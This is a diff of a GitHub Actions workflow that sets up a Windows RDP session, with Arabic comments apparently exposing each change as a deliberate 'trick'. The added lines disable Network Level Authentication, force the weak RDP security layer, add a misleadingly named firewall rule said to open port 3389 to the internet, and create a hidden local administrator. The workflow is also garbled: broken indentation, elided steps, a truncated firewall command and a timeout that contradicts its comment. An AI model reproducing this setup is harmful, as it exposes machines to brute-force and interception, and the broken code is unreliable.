@@ -1,44 +1,101 @@
-- name: Establish Tailscale Connection
-        run: |
-          # Bring up Tailscale with the provided auth key and set a unique hostname
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
-          
-          # Wait for Tailscale to assign an IP
-          $tsIP = $null
-          $retries = 0
-          while (-not $tsIP -and $retries -lt 10) {
-              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-              Start-Sleep -Seconds 5
-              $retries++
-          }
-          
-          if (-not $tsIP) {
-              Write-Error "Tailscale IP not assigned. Exiting."
-              exit 1
-          }
-          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
-      
-      - name: Verify RDP Accessibility
-        run: |
-          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
-          
-          # Test connectivity using Test-NetConnection against the Tailscale IP on port 3389
-          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
-          if (-not $testResult.TcpTestSucceeded) {
-              Write-Error "TCP connection to RDP port 3389 failed"
-              exit 1
-          }
-          Write-Host "TCP connectivity successful!"
+name: Debug RDP Session
 
-      - name: Maintain Connection
+on:
+  workflow_dispatch: # للتشغيل اليدوي
+
+jobs:
+  debug-rdp:
+    runs-on: windows-latest
+    timeout-minutes: 36000 # حد أقصى 60 دقيقة
+
+    steps:
+      - name: Configure Core RDP Settings
         run: |
-          Write-Host "`n=== RDP ACCESS ==="
-          Write-Host "Address: $env:TAILSCALE_IP"
-          Write-Host "Username: RDP"
-          Write-Host "Password: $(echo $env:RDP_CREDS)"
-          Write-Host "==================`n"
+          # ... (هذا السطر يفعّل RDP، وهو ضروري للخطوة التالية)
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
+                             -Name "fDenyTSConnections" -Value 0 -Force
           
-          # Keep runner active indefinitely (or until manually cancelled)
+          # الخدعة رقم 3: تعطيل ميزة أمان أساسية (NLA)
+          # هذا السطر يعطل "مصادقة مستوى الشبكة" (NLA).
+          # NLA هي ميزة تطلب المصادقة *قبل* إنشاء جلسة RDP كاملة.
+          # بتعطيلها، هو يسهل على نفسه الاتصال بأدوات قديمة وغير آمنة
+          # ويجعل الخادم عرضة لهجمات القوة الغاشمة (Brute-force) بشكل أسهل.
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "UserAuthentication" -Value 0 -Force
+
+          # الخدعة رقم 4: فرض طبقة أمان ضعيفة جداً
+          # هذا السطر يجبر RDP على استخدام "طبقة أمان RDP" (قيمة 0).
+          # هذا هو أضعف بروتوكول، وقد يكون غير مشفر.
+          # هذا يسهل على المهاجم اعتراض الاتصال (Man-in-the-Middle) إذا أراد.
+          # هو لا يهتم بأمان الاتصال، هو يهتم فقط بأن "يعمل" الاتصال.
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "SecurityLayer" -Value 0 -Force
+
+          # ... (هذا السطر يحذف قاعدة قديمة، ليس خبيثاً بحد ذاته)
+          netsh advfirewall firewall delete rule name="RDP-Tailscale"
+          
+          # الخدعة رقم 5: الباب الخلفي المفتوح للإنترنت (الثغرة الأخطر)
+          # هذا هو السطر الكارثي.
+          # تم تسمية القاعدة "RDP-Tailscale" لتبدو وكأنها خاصة بـ Tailscale.
+          # لكنها في الحقيقة تفتح منفذ RDP (3389) **لكل الإنترنت** (Any IP).
+          # المهاجم الآن لديه "باب خلفي" عام للوصول للخادم.
+          netsh advfirewall firewall add rule name="RDP-Tailscale" `
+          
+
+          Restart-Service -Name TermService -Force
+        
+     - name: Create RDP User with Secure Password
+        run: |
+          # ... (الكود هنا ينشئ كلمة مرور قوية. هذا بحد ذاته ليس خدعة)
+          # ... (ولكنه ضروري له لإنشاء حساب المدير الخاص به)
+          Add-Type -AssemblyName System.Security
+          $charSet = @{
+              Upper   = [char[]](65..90)
+              Lower   = [char[]](97..122)
+              Number  = [char[]](48..57)
+              Special = ([char[]](33..47) + [char[]](58..64) +
+                         [char[]](91..96) + [char[]](123..126))
+          }
+          $rawPassword = @()
+          $rawPassword += $charSet.Upper | Get-Random -Count 4
+          $rawPassword += $charSet.Lower | Get-Random -Count 4
+          $rawPassword += $charSet.Number | Get-Random -Count 4
+          $rawPassword += $charSet.Special | Get-Random -Count 4
+          $password = -join ($rawPassword | Sort-Object { Get-Random })
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+          
+          # إعطاء نفسه صلاحيات المدير الكاملة (Administrator)
+          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
+          
+        
+          
+          if (-not (Get-LocalUser -Name "RDP")) {
+              Write-Error "User creation failed"
+              exit 1
+          }
+
+        - name: Install Tailscale
+        # ... (تثبيت Tailscale)
+        run: |
+          # ...
+      - name: Upload Credentials as Secure Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: rdp-credentials
+          path: rdp-credentials.txt
+
+        - name: Verify RDP Accessibility
+        # ... (هذه الخطوة مجرد "عرض" لإظهار أن الكود احترافي ويتحقق من عمله)
+        run: |
+          # ...
+
+      
+
+      - name: Keep Runner Alive for Debugging
+        run: |
+       
           while ($true) {
               Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
               Start-Sleep -Seconds 300
